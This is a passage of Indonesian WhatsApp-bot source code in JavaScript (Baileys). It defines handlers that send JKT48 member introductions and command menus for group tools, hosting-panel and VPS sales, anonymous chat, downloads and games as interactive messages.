          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./SlimeMedia/image/gendis.jpg')}, { upload: slime.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
           {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"LynnZxD","url":"https://wa.me/6283167532721","merchant_url":"https://wa.me/6283167532721"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363325328533494@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await slime.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'jiko-desy': {
           let xmenu_oh = `
> *NAME* : *\`DESY NATALIA\`*
> *GENERATION* : 11
> *JIKO* : SEPERTI BUNGA DAISY, AKU AKAN MEMANCARKAN KESEGARAN DAN KEBAHAGIAAN`
           let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./SlimeMedia/image/desy.jpg')}, { upload: slime.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
           {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"LynnZxD","url":"https://wa.me/6283167532721","merchant_url":"https://wa.me/6283167532721"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363325328533494@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await slime.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'jiko-dena': {
           let xmenu_oh = `
> *NAME* : *\`DENA NATALIA\`*
> *GENERATION* : 11
> *JIKO* : TOK TOK! SIAPA? SI PENARI YANG AKAN MENARIKMU KE DUNIAKU`
           let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./SlimeMedia/image/dena.jpg')}, { upload: slime.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
           {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"LynnZxD","url":"https://wa.me/6283167532721","merchant_url":"https://wa.me/6283167532721"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363325328533494@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await slime.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'jiko-cynthia': {
           let xmenu_oh = `
> *NAME* : *\`CYNTHIA YAPUTERA\`*
> *GENERATION* : 11
> *JIKO* : SEMANGATKU TERUS MENERUS MELUAP, POP POP!`
           let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./SlimeMedia/image/cynthia.jpg')}, { upload: slime.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
           {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"LynnZxD","url":"https://wa.me/6283167532721","merchant_url":"https://wa.me/6283167532721"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363325328533494@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await slime.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'jiko-chelsea': {
           let xmenu_oh = `
> *NAME* : *\`CHELSEA DAVINA\`*
> *GENERATION* : 11
> *JIKO* : AS BRIGHT AS THE SHOOTING STARS IN THE STARRY NIGHT SKY`
           let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./SlimeMedia/image/chelsea.jpg')}, { upload: slime.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
           {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"LynnZxD","url":"https://wa.me/6283167532721","merchant_url":"https://wa.me/6283167532721"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363325328533494@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await slime.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'jiko-celline': {
           let xmenu_oh = `
> *NAME* : *\`CELLINE THEFANI\`*
> *GENERATION* : 11
> *JIKO* : SEMANIS PERMEN KAPAS DAN SEINDAH BUNGA LAVENDER`
           let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./SlimeMedia/image/celline.jpg')}, { upload: slime.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
           {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"LynnZxD","url":"https://wa.me/6283167532721","merchant_url":"https://wa.me/6283167532721"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363325328533494@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await slime.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'jiko-cathleen': {
           let xmenu_oh = `
> *NAME* : *\`CATHLEEN NIXIE\`*
> *GENERATION* : 11
> *JIKO* : CRING... SI PERI CANTIK JELITA, ITULAH AKU`
           let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./SlimeMedia/image/cathlin.jpg')}, { upload: slime.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
           {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"LynnZxD","url":"https://wa.me/6283167532721","merchant_url":"https://wa.me/6283167532721"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363325328533494@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await slime.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'jiko-alya': {
           let xmenu_oh = `
> *NAME* : *\`ALYA AMANDA\`*
> *GENERATION* : 11
> *JIKO* : JIKA HATIMU SEDANG MENANGIS, AKU AKAN DATANG SEBAGAI PELANGI`
           let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./SlimeMedia/image/alya.jpg')}, { upload: slime.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
           {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"LynnZxD","url":"https://wa.me/6283167532721","merchant_url":"https://wa.me/6283167532721"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363325328533494@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await slime.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
           case 'jiko-christy': {
           let xmenu_oh = `
> *NAME* : *\`ANGELINA CHRISTY\`*
> *GENERATION* : 7
> *JIKO* : PEDULI DAN BERBAIK HATI SIAPAKAH DIA? CHRISTY`
           let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./SlimeMedia/image/christy.jpg')}, { upload: slime.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
           {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"LynnZxD","url":"https://wa.me/6283167532721","merchant_url":"https://wa.me/6283167532721"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363325328533494@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await slime.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
           case 'groupmenu': {
           if (!isRegistered) return reply('Daftar dulu lah, ketik .daftar')
           let xmenu_oh = `
⫹┈─────────┈⫺
*メ G R O U P M E N U メ*
⫹┈─────────┈⫺
     ヤ ◦ ᴛᴀɢᴀʟʟ
     ヤ ◦ ʜɪᴅᴇᴛᴀɢ
     ヤ ◦ ᴅᴇᴍᴏᴛᴇ
     ヤ ◦ ᴘʀᴏᴍᴏᴛᴇ
     ヤ ◦ ᴀᴅᴅ
     ヤ ◦ ᴋɪᴄᴋ
     ヤ ◦ ɪɴᴠɪᴛᴇ
     ヤ ◦ ɪɴᴛʀᴏ
     ヤ ◦ ꜱᴇɴᴅʟɪɴᴋɢᴄ
     ヤ ◦ ʀᴇꜱᴇᴛʟɪɴᴋɢᴄ
     ヤ ◦ ʟɪɴᴋɢʀᴏᴜᴘ
     ヤ ◦ ᴛᴏᴛᴀɢ
     ヤ ◦ ᴀɴᴛɪʟɪɴᴋ
     ヤ ◦ ᴀɴᴛɪʙᴏᴛ
     ヤ ◦ ꜱᴇᴛᴘᴘɢʀᴏᴜᴘ
     ヤ ◦ ᴅᴇʟ
     ヤ ◦ ꜱᴇᴛɴᴀᴍᴇɢᴄ
     ヤ ◦ ᴅᴇʟᴘᴘɢᴄ
     ヤ ◦ ᴀɴᴛɪᴛᴏxɪᴄ
     ヤ ◦ ᴏᴘᴇɴᴛɪᴍᴇ
     ヤ ◦ ᴄʟᴏꜱᴇᴛɪᴍᴇ
     ヤ ◦ ᴡᴇʟᴄᴏᴍᴇ
     ヤ ◦ ᴄᴇᴋᴍᴇᴍ
     ヤ ◦ ᴛɪᴍᴇʀɢᴄ`
           let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./SlimeMedia/image/slime.jpg')}, { upload: slime.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
           {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"LynnZxD","url":"https://wa.me/6283167532721","merchant_url":"https://wa.me/6283167532721"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363325328533494@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await slime.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'panelmenu': case 'cpanelmenu': case 'menupanel': {
if (!isRegistered) return reply(mess.regis)
let xmenu_oh = `
⫹┈─────────┈⫺
*メ P A N E L M E N U メ*
⫹┈─────────┈⫺
     ヤ ◦ ʀᴀᴍʟɪꜱᴛ
     ヤ ◦ ʙᴀᴄᴋᴜᴘ
     ヤ ◦ ᴛᴜᴛᴏʀɪᴀʟ
     ヤ ◦ ꜱᴛᴀʀᴛꜱʀᴠ 
     ヤ ◦ ᴜɴꜱᴜꜱᴘᴇɴᴅ
     ヤ ◦ ᴡᴇʙᴘᴀɴᴇʟ
     ヤ ◦ ꜱᴜꜱᴘᴇɴᴅ
     ヤ ◦ ꜱᴇɴᴅᴘᴀɴᴇʟ
     ヤ ◦ ᴀᴅᴅꜱʀᴠ
     ヤ ◦ ʟɪꜱᴛᴀᴅᴍɪɴ
     ヤ ◦ ᴀᴅᴍɪɴ
     ヤ ◦ ᴀᴅᴅᴜꜱᴇʀ
     ヤ ◦ ᴅᴇʟᴜꜱʀ
     ヤ ◦ ʟɪꜱᴛᴜꜱʀ
     ヤ ◦ ʟɪꜱᴛꜱʀᴠ
     ヤ ◦ ᴜᴘᴅᴀᴛᴇꜱʀᴠ
     ヤ ◦ ᴅᴇᴛᴜꜱʀ
     ヤ ◦ ʀᴇɪɴꜱᴛᴀʟʟ
     ヤ ◦ ᴄᴘᴀɴᴇʟ
     ヤ ◦ ᴘᴀɴᴇʟ
     ヤ ◦ 1ɢʙ
     ヤ ◦ 2ɢʙ
     ヤ ◦ 3ɢʙ
     ヤ ◦ 4ɢʙ
     ヤ ◦ 5ɢʙ
     ヤ ◦ 6ɢʙ
     ヤ ◦ 7ɢʙ
     ヤ ◦ 8ɢʙ
     ヤ ◦ ᴜɴʟɪ
     ヤ ◦ 1ɢʙꜱᴀʟᴅᴏ
     ヤ ◦ 2ɢʙꜱᴀʟᴅᴏ
     ヤ ◦ 3ɢʙꜱᴀʟᴅᴏ
     ヤ ◦ 4ɢʙꜱᴀʟᴅᴏ
     ヤ ◦ 5ɢʙꜱᴀʟᴅᴏ
     ヤ ◦ 6ɢʙꜱᴀʟᴅᴏ
     ヤ ◦ 7ɢʙꜱᴀʟᴅᴏ
     ヤ ◦ 8ɢʙꜱᴀʟᴅᴏ
     ヤ ◦ ᴜɴʟɪꜱᴀʟᴅᴏ`
                let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./SlimeMedia/image/slime.jpg')}, { upload: slime.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
              "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Beli Panel","id":".belipanel"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363325328533494@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await slime.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'domenu': {
if (!isRegistered) return reply(mess.regis)
let xmenu_oh = `
⫹┈─────────┈⫺
*メ D O M E N U メ*
⫹┈─────────┈⫺
     ヤ ◦ ꜱɪꜱᴀᴅʀᴏᴘʟᴇᴛ
     ヤ ◦ ʀᴇꜱᴛᴀʀᴛᴠᴘꜱ
     ヤ ◦ ᴅᴇʟᴅʀᴏᴘʟᴇᴛ
     ヤ ◦ ʟɪꜱᴛᴅʀᴏᴘʟᴇᴛ
     ヤ ◦ ᴄᴇᴋᴅʀᴏᴘʟᴇᴛ
     ヤ ◦ ᴠᴘꜱ1ɢ1ᴄ
     ヤ ◦ ᴠᴘꜱ2ɢ1ᴄ
     ヤ ◦ ᴠᴘꜱ2ɢ2ᴄ
     ヤ ◦ ᴠᴘꜱ4ɢ2ᴄ
     ヤ ◦ ᴠᴘꜱ8ɢ4ᴄ
     ヤ ◦ ꜱᴠᴘꜱ
     ヤ ◦ ꜱᴇɴᴅᴠᴘꜱ
     ヤ ◦ ᴛᴜʀɴᴏꜰꜰ
     ヤ ◦ ᴛᴜʀɴᴏɴ
     ヤ ◦ ʀᴇʙᴜɪʟᴅ`
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./SlimeMedia/image/slime.jpg')}, { upload: slime.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
           {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"LynnZxD","url":"https://wa.me/6283167532721","merchant_url":"https://wa.me/6283167532721"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363325328533494@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await slime.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'linodemenu': {
if (!isRegistered) return reply(mess.regis)
let xmenu_oh = `
⫹┈─────────┈⫺
*メ L I N O D E M E N U メ*
⫹┈─────────┈⫺
     ヤ ◦ ʀᴇꜱᴇᴛᴘᴀꜱꜱᴡᴏʀᴅ
     ヤ ◦ ᴅᴇʟᴇᴛᴇʟɪɴᴏᴅᴇ
     ヤ ◦ ʟɪꜱᴛʟɪɴᴏᴅᴇ
     ヤ ◦ ᴏɴʟɪɴᴏᴅᴇ
     ヤ ◦ ᴏꜰꜰʟɪɴᴏᴅᴇ
     ヤ ◦ ʀᴇʙᴏᴏᴛʟɪɴᴏᴅᴇ
     ヤ ◦ ʀᴇʙᴜɪʟᴅʟɪɴᴏᴅᴇ
     ヤ ◦ ꜱɪꜱᴀʟɪɴᴏᴅᴇ
     ヤ ◦ ꜱᴀʟᴅᴏʟɪɴᴏᴅᴇ
     ヤ ◦ ᴄᴇᴋᴠᴘꜱʟɪɴᴏᴅᴇ
     ヤ ◦ ʟɪɴᴏᴅᴇ2ɢʙ
     ヤ ◦ ʟɪɴᴏᴅᴇ4ɢʙ
     ヤ ◦ ʟɪɴᴏᴅᴇ8ɢʙ
     ヤ ◦ ʟɪɴᴏᴅᴇ16ɢʙ`
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./SlimeMedia/image/slime.jpg')}, { upload: slime.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
           {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"LynnZxD","url":"https://wa.me/6283167532721","merchant_url":"https://wa.me/6283167532721"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363325328533494@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await slime.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'anonymousmenu': {
if (!isRegistered) return reply(mess.regis)
let xmenu_oh = `
⫹┈─────────┈⫺
*メ A N O N Y M O U S メ*
⫹┈─────────┈⫺
     ヤ ◦ ᴍᴇɴғᴇs
     ヤ ◦ ʙᴀʟᴀsᴍᴇɴғᴇs
     ヤ ◦ ʟᴀɴᴊᴜᴛ
     ヤ ◦ sᴛᴀʀᴛ
     ヤ ◦ sᴇɴᴅᴘʀᴏғɪʟᴇ
     ヤ ◦ ᴀɴᴏɴʏᴍᴏᴜsᴄʜᴀᴛ
     ヤ ◦ ɴᴜʟɪsᴋᴀɴᴀɴ
     ヤ ◦ ɴᴜʟɪsᴋɪʀɪ
     ヤ ◦ ғᴏʟɪᴏᴋɪʀɪ
     ヤ ◦ ғᴏʟɪᴏᴋᴀɴᴀɴ`
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./SlimeMedia/image/slime.jpg')}, { upload: slime.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
           {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"LynnZxD","url":"https://wa.me/6283167532721","merchant_url":"https://wa.me/6283167532721"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363325328533494@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await slime.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'downloadmenu': {
if (!isRegistered) return reply(mess.regis)
let xmenu_oh = `
⫹┈─────────┈⫺
*メ D O W N L O A D M E N U メ*
⫹┈─────────┈⫺
     ヤ ◦ ᴘʟᴀʏ
     ヤ ◦ ʏᴛᴍᴘ4
     ヤ ◦ ʏᴛᴍᴘ3
     ヤ ◦ sᴘᴏᴛɪғʏ
     ヤ ◦ ɪɴꜱᴛᴀɢʀᴀᴍ
     ヤ ◦ ᴛɪᴋᴛᴏᴋ
     ヤ ◦ ᴛɪᴋᴛᴏᴋᴀᴜᴅɪᴏ
     ヤ ◦ ᴍᴇᴅɪᴀꜰɪʀᴇ
     ヤ ◦ ʏᴛs
     ヤ ◦ ᴛᴛsᴇᴀʀᴄʜ
     ヤ ◦ ᴛᴛsᴇᴀʀᴄʜ2
     ヤ ◦ ᴛᴛsᴇᴀʀᴄʜ3
     ヤ ◦ ɢᴏᴏɢʟᴇ
     ヤ ◦ ᴛᴡɪᴛᴛᴇʀ
     ヤ ◦ ɢᴅʀɪᴠᴇ
     ヤ ◦ ɢɪᴛᴄʟᴏɴᴇ
     ヤ ◦ ᴘɪɴ
     ヤ ◦ ᴄᴀᴘᴄᴜᴛ`
           let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./SlimeMedia/image/slime.jpg')}, { upload: slime.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
           {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"LynnZxD","url":"https://wa.me/6283167532721","merchant_url":"https://wa.me/6283167532721"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363325328533494@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await slime.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
          case 'gamemenu': {
          if (!isRegistered) return reply(mess.regis)
          let xmenu_oh = `
⫹┈─────────┈⫺
*メ G A M E M E N U メ*
⫹┈─────────┈⫺
     ヤ ◦ ᴛᴇʙᴀᴋʙᴏᴍ
     ヤ ◦ sᴜɪᴛᴘᴠᴘ
     ヤ ◦ ᴛᴇʙᴀᴋᴋᴀᴛᴀ
     ヤ ◦ ᴛᴇʙᴀᴋɢᴀᴍʙᴀʀ
     ヤ ◦ sᴜsᴜɴᴋᴀᴛᴀ
     ヤ ◦ ᴛɪᴄᴛᴀᴄᴛᴏᴇ
